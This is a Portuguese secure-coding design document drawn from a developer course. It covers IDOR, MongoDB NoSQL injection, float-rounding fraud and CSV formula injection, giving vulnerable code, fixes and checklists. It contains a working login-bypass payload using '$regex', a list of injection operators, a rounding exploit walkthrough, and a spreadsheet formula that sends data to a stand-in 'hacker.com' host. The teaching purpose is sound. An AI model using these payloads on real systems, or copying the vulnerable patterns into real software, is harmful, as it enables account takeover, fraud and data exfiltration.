# SOFTWARE DESIGN DOCUMENT (SDD)

## Segurança Backend — Broken Access Control, NoSQL Injection e Validação Paranoica de Entradas

| Campo                | Valor                                                        |
|----------------------|--------------------------------------------------------------|
| **Título**           | Segurança Backend: Broken Access Control (IDOR), NoSQL Injection e Validação Paranoica de Entradas |
| **Versão**           | 1.0                                                          |
| **Data**             | 2026-04-08                                                   |
| **Classificação**    | Confidencial                                                 |
| **Autor**            | Baseado no curso "Segurança Para Devs"                       |

---

## 1. Introdução

### 1.1 Propósito

Este documento descreve o design de segurança para vulnerabilidades no backend relacionadas ao controle de acesso quebrado, injeção em bancos NoSQL e validação de tipos de dados. Abrange a falha #1 do OWASP Top 10 (Broken Access Control / IDOR), NoSQL Injection via operadores MongoDB, e exploração de validação fraca de tipos (inteiros vs. floats, injeção de fórmulas em CSV/Excel).

### 1.2 Escopo

- Broken Access Control (OWASP #1): acesso não autorizado a recursos por manipulação de IDs
- IDOR (Insecure Direct Object Reference): referência direta a objetos sem verificação de propriedade
- NoSQL Injection: injeção via operadores (`$regex`, `$ne`, `$gt`) em consultas MongoDB
- Validação de tipos: arredondamento de floats causando criação de dinheiro fictício
- CSV/Excel Formula Injection: fórmulas maliciosas em exportações de dados

### 1.3 Definições e Acrônimos

| Termo                    | Definição                                                        |
|--------------------------|------------------------------------------------------------------|
| **Broken Access Control** | Falha onde usuários acessam recursos ou executam ações sem autorização |
| **IDOR**                 | Insecure Direct Object Reference — acesso a objetos por ID manipulado |
| **NoSQL Injection**       | Injeção de operadores de consulta em bancos NoSQL                |
| **Formula Injection**     | Inserção de fórmulas (=, +, @) em dados exportados para CSV/Excel |
| **OWASP Top 10**         | Lista das 10 vulnerabilidades mais comuns em aplicações web       |

### 1.4 Princípio Fundamental

> **Broken Access Control é uma falha de regra de negócio.** Não existe ferramenta automatizada que possa detectá-la ou corrigi-la. Cada endpoint (GET, POST, PUT, DELETE) precisa de validação explícita de que o usuário tem permissão para acessar/modificar o recurso. Isso deve estar modelado nos requisitos, testado nos testes e implementado no código.

---

## 2. Visão Geral de Arquitetura

### 2.1 Superfícies de Broken Access Control

```
┌──────────────────────────────────────────────────────────────────────┐
│           SUPERFÍCIES DE BROKEN ACCESS CONTROL                      │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐      │
│  │  1. ID NA URL (GET)                                       │      │
│  │     /ticket/2  → Usuário troca ID para ver ticket alheio  │      │
│  └────────────────────────────────────────────────────────────┘      │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐      │
│  │  2. ID EM CAMPO HIDDEN (POST/PUT)                         │      │
│  │     <input hidden name="id" value="45">                   │      │
│  │     → Usuário inspeciona e troca o ID                     │      │
│  └────────────────────────────────────────────────────────────┘      │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐      │
│  │  3. ID EM OBJETO JSON (POST/PUT)                           │      │
│  │     {"conta": 23} → Troca para conta de outra empresa     │      │
│  └────────────────────────────────────────────────────────────┘      │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐      │
│  │  4. TIPO DE OBJETO EM API GENÉRICA                        │      │
│  │     /update?objeto=user&id=33                             │      │
│  │     → Troca "user" por "group", "environment", etc.       │      │
│  └────────────────────────────────────────────────────────────┘      │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────┐      │
│  │  5. OPERAÇÕES CRUD INCOMPLETAS                             │      │
│  │     GET e POST validam acesso...                          │      │
│  │     ...mas PUT e DELETE esquecem de validar!               │      │
│  └────────────────────────────────────────────────────────────┘      │
│                                                                      │
│  ⚠️  TODOS os endpoints (GET/POST/PUT/DELETE) precisam de          │
│     verificação de controle de acesso                              │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.2 OWASP Top 10 — Posição

```
┌────────────────────────────────────────────────┐
│          OWASP TOP 10 (2021/2024)              │
│                                                 │
│  #1  BROKEN ACCESS CONTROL  ← Esta aula        │
│  #2  Cryptographic Failures                     │
│  #3  Injection                                  │
│  #4  Insecure Design                            │
│  #5  Security Misconfiguration                  │
│  #6  Vulnerable Components                      │
│  #7  Auth Failures                              │
│  #8  Software/Data Integrity                    │
│  #9  Logging/Monitoring Failures                │
│  #10 Server-Side Request Forgery                │
│                                                 │
│  Broken Access Control = #1 há 2 edições       │
│  consecutivas do Top 10                          │
└────────────────────────────────────────────────┘
```

---

## 3. Componentes de Design

### 3.1 Componente: Broken Access Control / IDOR

#### 3.1.1 Descrição

Broken Access Control ocorre quando um usuário pode acessar recursos ou executar ações para as quais não tem permissão. A forma mais comum é IDOR (Insecure Direct Object Reference), onde o usuário manipula identificadores sequenciais (IDs) em URLs, campos ocultos ou payloads JSON para acessar dados de outros usuários.

#### 3.1.2 Código Vulnerável

```python
# ❌ VULNERÁVEL — Sem verificação de propriedade do ticket
@app.route('/ticket/<id>')
def ticket(id):
    # Busca o ticket pelo ID, sem verificar se pertence ao usuário logado
    ticket = db(db.ticket.id == id).select().first()
    return {'ticket': ticket}

# Ataque: /ticket/2 → Visualiza ticket de outro usuário
# IDs sequenciais são fáceis de deduzir: 1, 2, 3, ...
```

#### 3.1.3 Código Seguro

```python
# ✅ SEGURO — Verifica se o ticket pertence ao usuário logado
@app.route('/ticket/<id>')
def ticket(id):
    user = auth.get_user()
    ticket = db(db.ticket.id == id).select().first()

    if not ticket or ticket.user != user.id:
        return 'Unauthorized', 403  # ← Controle de acesso

    return {'ticket': ticket}
```

#### 3.1.4 Pontos de Validação Obrigatórios

```
┌──────────────────────────────────────────────────────────────────┐
│  ONDE VALIDAR CONTROLE DE ACESSO                                │
│                                                                  │
│  ✓ GET    — SELECT filtrando por usuário                         │
│  ✓ POST   — Verificar propriedade dos recursos referenciados    │
│  ✓ PUT    — Verificar se o recurso pertence ao usuário          │
│  ✓ DELETE — Verificar se o usuário pode excluir o recurso       │
│                                                                  │
│  Fontes de input que precisam de verificação:                   │
│  ✓ ID na URL (query string ou path parameter)                   │
│  ✓ ID em campo hidden (<input type="hidden" name="id">)        │
│  ✓ ID em objeto JSON (payload de API)                           │
│  ✓ Header HTTP (ex: X-User-Role, X-Last-Edited)                │
│  ✓ Cookies (valores que influenciam permissões)                 │
│  ✓ Tipo de objeto em APIs genéricas (/update?objeto=user)      │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.1.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| AC-1 | Todo endpoint que acessa recurso por ID deve verificar propriedade      | Crítica    |
| AC-2 | Nunca presuma que IDs sequenciais são seguros                           | Alta       |
| AC-3 | Valide acesso em TODOS os métodos HTTP (GET, POST, PUT, DELETE)         | Crítica    |
| AC-4 | Valide IDs em campos hidden, query strings, headers e cookies           | Alta       |
| AC-5 | Valide objetos referenciados em payloads JSON (conta, grupo, banco)     | Alta       |
| AC-6 | APIs genéricas (update genérico) precisam de controle de acesso forte    | Crítica    |
| AC-7 | Controle de acesso deve estar nos requisitos técnicos                   | Alta       |
| AC-8 | Escreva testes automatizados para cada regra de acesso                   | Alta       |

---

### 3.2 Componente: NoSQL Injection

#### 3.2.1 Descrição

Bancos NoSQL como MongoDB não usam SQL, mas também são vulneráveis a injeção. Quando o input do usuário é passado diretamente como objeto de consulta, operadores como `$regex`, `$ne`, `$gt` e `$where` permitem bypass de autenticação e extração de dados.

#### 3.2.2 Código Vulnerável

```javascript
// ❌ VULNERÁVEL — Input do usuário passado diretamente como consulta
async function login(email, password) {
    const user = await db.collection('users').findOne({
        email: email,      // Input do usuário
        password: password  // Input do usuário
    });
    return user;
}
```

```
Ataque — Bypass de autenticação com $regex:
  POST /login
  {
    "email": "alice@example.com",
    "password": { "$regex": ".*" }
  }

  Consulta gerada no MongoDB:
    db.users.findOne({
      email: "alice@example.com",
      password: { "$regex": ".*" }   ← Qualquer caractere = qualquer senha
    })

  Resultado: Login bem-sucedido sem conhecer a senha!
```

```
Variantes de operadores de ataque:
  { "$regex": ".*" }     → Qualquer string (bypass de senha)
  { "$ne": "" }          → Qualquer valor não vazio
  { "$gt": "" }           → Qualquer valor maior que string vazia
  { "$where": "..." }    → Execução de JavaScript no MongoDB
  { "$exists": true }    → Verifica se campo existe
```

#### 3.2.3 Código Seguro

```javascript
// ✅ ALTERNATIVA 1 — Validação de tipo
async function login(email, password) {
    if (typeof email !== 'string' || typeof password !== 'string') {
        return null;
    }
    const user = await db.collection('users').findOne({
        email: email,
        password: password
    });
    return user;
}

// ✅ ALTERNATIVA 2 — Coerção de tipo
async function login(email, password) {
    const user = await db.collection('users').findOne({
        email: String(email),
        password: String(password)
    });
    return user;
}

// ✅ ALTERNATIVA 3 — TypeScript (tipagem estática)
async function login(email: string, password: string): Promise<User | null> {
    // O TypeScript garante que email e password são strings
    // Use validação em runtime também (Zod, Joi, etc.)
}
```

#### 3.2.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| NI-1 | Bancos NoSQL também são vulneráveis a injeção                           | Crítica    |
| NI-2 | Valide o tipo de TODOS os inputs antes de passar para consultas NoSQL   | Crítica    |
| NI-3 | Use `typeof === 'string'` ou coerção `String()` para forçar strings     | Alta       |
| NI-4 | Use TypeScript ou validação em runtime (Zod, Joi) para tipar inputs      | Alta       |
| NI-5 | Nunca passe objetos JavaScript do cliente diretamente para consultas     | Crítica    |
| NI-6 | Prepared queries não resolvem NoSQL Injection — valide tipos            | Alta       |

---

### 3.3 Componente: Validação de Tipos e Integridade de Dados

#### 3.3.1 Descrição

Validação fraca de tipos permite que atacantes explorem conversões automáticas para criar dados fraudulentos. O exemplo mais crítico é a transferência de valores fracionários em sistemas que operam apenas com inteiros: `Math.round(0.5) = 0` no destino de débito e `Math.round(0.5) = 1` no destino de crédito, criando dinheiro do nada.

#### 3.3.2 Código Vulnerável

```javascript
// ❌ VULNERÁVEL — Sem validação de tipo (inteiro)
const saldos = { alice: 100, bob: 1, laranja: 0 };

function transferir(origem, destino, valor) {
    saldos[origem] -= Math.round(valor);
    saldos[destino] += Math.round(valor);
}

// Ataque: transferir 0.5 (meio crédito)
transferir('alice', 'bob', 0.5);
// Math.round(-0.5) = 0   → Alice não perde nada!
// Math.round(0.5)  = 1   → Bob ganha 1 crédito!

// Repetindo 100x: alice=100, bob=1, laranja=100
// → 100 créditos criados do nada
```

```
Exploração passo a passo:
  Estado inicial:   alice=100, bob=1, laranja=0

  Transferência de 0.5 de alice para bob:
    alice -= Math.round(0.5)  → alice -= 0  → alice = 100 (não perdeu!)
    bob   += Math.round(0.5)  → bob  += 1  → bob   = 2   (ganhou!)

  Transferência de 1 de bob para laranja:
    bob    -= 1 → bob = 1
    laranja += 1 → laranja = 1

  Repetir 100x:
    alice = 100 (nunca perdeu!)
    bob   = 1   (volta ao original)
    laranja = 100 (créditos criados do nada!)
```

#### 3.3.3 Código Seguro

```javascript
// ✅ SEGURO — Validação de tipo inteiro
function transferir(origem, destino, valor) {
    if (valor !== Math.round(valor)) {
        console.log('Valor inválido: apenas inteiros são permitidos');
        return false;
    }
    saldos[origem] -= valor;
    saldos[destino] += valor;
    return true;
}

// ✅ SEGURO — TypeScript
function transferir(origem: string, destino: string, valor: number): boolean {
    if (!Number.isInteger(valor)) {
        throw new Error('Valor inválido: apenas inteiros são permitidos');
    }
    // ...
}
```

#### 3.3.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| VT-1 | Valide o tipo de todos os inputs, especialmente valores monetários       | Crítica    |
| VT-2 | Use `Number.isInteger()` ou equivalente para validar inteiros            | Alta       |
| VT-3 | Não confie em conversões automáticas de tipo                             | Alta       |
| VT-4 | Use TypeScript ou linguagem com tipagem estática                         | Média      |
| VT-5 | Teste com valores de borda: 0.5, -0.5, NaN, Infinity, strings           | Alta       |

---

### 3.4 Componente: CSV/Excel Formula Injection

#### 3.4.1 Descrição

Quando dados do usuário são exportados para CSV ou Excel sem validação, o atacante pode inserir fórmulas que serão executadas quando o arquivo for aberto. Funções como `=WEBSERVICE()`, `=EXEC()`, `=CALL()` e `=HYPERLINK()` podem fazer requisições web, executar código e exfiltrar dados.

#### 3.4.2 Mecanismo de Ataque

```
Campo de descrição no sistema:
  Usuário insere: =WEBSERVICE("https://hacker.com/?ip="&IFCONFIG.ME())

Exportação para CSV:
  nome;descrição;valor
  Alice;=WEBSERVICE("https://hacker.com/?ip="&IFCONFIG.ME());100

Quando aberto no Excel/LibreOffice:
  → A célula executa a fórmula automaticamente
  → Requisição web para o servidor do atacante
  → IP e dados do usuário são exfiltrados
```

#### 3.4.3 Caracteres Perigosos em CSV/Excel

| Caractere Inicial | Função                                    | Risco                    |
|--------------------|-------------------------------------------|--------------------------|
| `=`                | Fórmula                                   | Execução de código       |
| `+`                | Fórmula                                   | Execução de código       |
| `-`                | Fórmula                                   | Execução de código       |
| `@`                | Indicador de fórmula (algumas versões)    | Execução de código       |
| `\t` (tab)         | Fórmula                                   | Execução de código       |
| `\r` (carriage return) | Hyperlink injection                  | Navegação automática     |

#### 3.4.4 Código Seguro

```javascript
// ✅ SEGURO — Sanitizar valores antes de exportar para CSV/Excel
function sanitizeCSVValue(value) {
    const str = String(value);
    // Escapa caracteres perigosos prependendo apóstrofo
    if (/^[=+\-@\t\r]/.test(str)) {
        return "'" + str;  // Apóstrofo força texto no Excel
    }
    return str;
}

// ✅ SEGURO — Validação na entrada (mais forte)
function validateInput(value) {
    const str = String(value);
    if (/^[=+\-@\t\r]/.test(str)) {
        throw new Error('Valor não pode começar com: = + - @');
    }
    return str;
}
```

#### 3.4.5 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| FI-1 | Valide inputs que serão exportados para CSV/Excel                       | Alta       |
| FI-2 | Bloqueie valores que começam com `=`, `+`, `-`, `@`, `\t`, `\r`        | Alta       |
| FI-3 | Na exportação, prefixe com apóstrofo para forçar interpretação como texto | Média      |
| FI-4 | Não confie no alerta de segurança do Excel/LibreOffice                   | Média      |
| FI-5 | Funções perigosas: `WEBSERVICE`, `EXEC`, `CALL`, `HYPERLINK`, `CMD`     | Alta       |

---

## 4. Matriz de Ameaças e Mitigações

| # | Ameaça                              | Vetor                         | Impacto                           | Mitigação                                      | Ref. |
|---|-------------------------------------|-------------------------------|-----------------------------------|------------------------------------------------|------|
| 1 | Acesso a ticket alheio              | ID na URL (`/ticket/2`)      | Vazamento de dados                | Verificar propriedade do recurso                | 3.1  |
| 2 | Edição de recurso alheio            | Campo hidden com ID           | Modificação não autorizada        | Validar propriedade no POST/PUT                 | 3.1  |
| 3 | Inserção em conta alheia            | ID de conta em JSON           | Inserção de dados fraudulentos    | Validar propriedade de recursos referenciados   | 3.1  |
| 4 | Acesso a objetos via API genérica   | Tipo de objeto na query string| Acesso a tabelas não autorizadas  | Whitelist de tipos + controle de acesso forte    | 3.1  |
| 5 | Exclusão de recurso alheio          | PUT/DELETE sem validação      | Perda de dados                    | Validar propriedade em TODOS os métodos HTTP    | 3.1  |
| 6 | NoSQL Injection — bypass de senha   | `$regex: ".*"` no password    | Bypass de autenticação            | Validar tipo (string) antes da consulta         | 3.2  |
| 7 | NoSQL Injection — extração de dados | `$ne: ""` no campo           | Exfiltração de dados              | Validar tipo de todos os inputs                 | 3.2  |
| 8 | Criação de dinheiro fictício        | Valor `0.5` (float vs int)   | Fraude financeira                 | Validar `Number.isInteger()`                     | 3.3  |
| 9 | Formula Injection em CSV            | `=WEBSERVICE(...)` no campo  | Exfiltração de IP/dados           | Bloquear `=`, `+`, `-`, `@` no input           | 3.4  |
| 10| Execução de código via Excel        | `=EXEC()`, `=CALL()`        | RCE na máquina do usuário         | Sanitizar saída CSV / validar entrada           | 3.4  |

---

## 5. Checklists de Verificação

### 5.1 Checklist — Broken Access Control

- [ ] Todo endpoint GET valida se o recurso pertence ao usuário logado
- [ ] Todo endpoint POST valida propriedade dos recursos referenciados (IDs em campos hidden, JSON)
- [ ] Todo endpoint PUT valida se o recurso pertence ao usuário
- [ ] Todo endpoint DELETE valida se o usuário pode excluir o recurso
- [ ] APIs genéricas (update genérico) possuem whitelist de tipos de objetos
- [ ] IDs em query strings são validados (pertencem ao usuário)
- [ ] IDs em campos hidden são validados no servidor
- [ ] Headers HTTP que influenciam permissão são validados no servidor
- [ ] Cookies que influenciam permissão são validados no servidor
- [ ] Regras de acesso estão documentadas nos requisitos técnicos
- [ ] Testes automatizados cobrem cenários de acesso não autorizado

### 5.2 Checklist — NoSQL Injection

- [ ] Tipo de todos os inputs é validado antes de consultas NoSQL
- [ ] Inputs do usuário são forçados para string (`String()`) antes de consultas
- [ ] Objects/arrays do JavaScript não são passados diretamente para o MongoDB
- [ ] TypeScript, Zod ou equivalente é usado para validação de tipos em runtime
- [ ] Consideração de migração para ORM com proteção built-in (Mongoose, Prisma)

### 5.3 Checklist — Validação de Entradas

- [ ] Valores monetários são validados como inteiros (`Number.isInteger()`)
- [ ] Campos numéricos não aceitam strings, floats ou valores especiais (NaN, Infinity)
- [ ] Valores exportados para CSV/Excel não começam com `=`, `+`, `-`, `@`
- [ ] Validação de entrada é feita no servidor, não apenas no cliente
- [ ] Framework com validação automática de tipos é utilizado (FastAPI, TypeScript, etc.)

---

## 6. Tabela Comparativa — Proteções por Tecnologia

| Tecnologia       | Protege contra IDOR? | Protege contra NoSQL Injection? | Validação de Tipos? |
|------------------|----------------------|--------------------------------|----------------------|
| **Sem proteção**  | ❌ Não               | ❌ Não                          | ❌ Não               |
| **typeof check** | ❌ Não               | ✅ Sim                          | ✅ Parcial           |
| **TypeScript**   | ❌ Não               | ✅ Em compile-time              | ✅ Em compile-time   |
| **Zod/Joi**      | ❌ Não               | ✅ Sim                          | ✅ Sim               |
| **ORM (Mongoose)**| ❌ Parcial          | ✅ Sim                          | ✅ Sim               |
| **FastAPI/Pydantic**| ❌ Não             | N/A                            | ✅ Sim               |
| **Testes automatizados**| ✅ Sim           | ✅ Sim                          | ✅ Sim               |

---

## 7. Referências

| Recurso                      | URL/Descrição                                             |
|------------------------------|-----------------------------------------------------------|
| OWASP Top 10 (2021)          | https://owasp.org/Top10/A01_2021-Broken_Access_Control/   |
| OWASP — IDOR                 | https://owasp.org/www-community/attacks/Insecure_Direct_Object_References |
| OWASP — NoSQL Injection       | https://owasp.org/www-community/attacks/NoSQL_Injection   |
| MongoDB — Query Operators     | https://www.mongodb.com/docs/manual/reference/operator/query/ |
| CWE-639 — Bypass of Authorization | https://cwe.mitre.org/data/definitions/639.html       |
| CWE-918 — SSRF               | https://cwe.mitre.org/data/definitions/918.html           |
| CSV Injection — OWASP Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/CSV_Injection_Prevention_Cheat_Sheet.html |
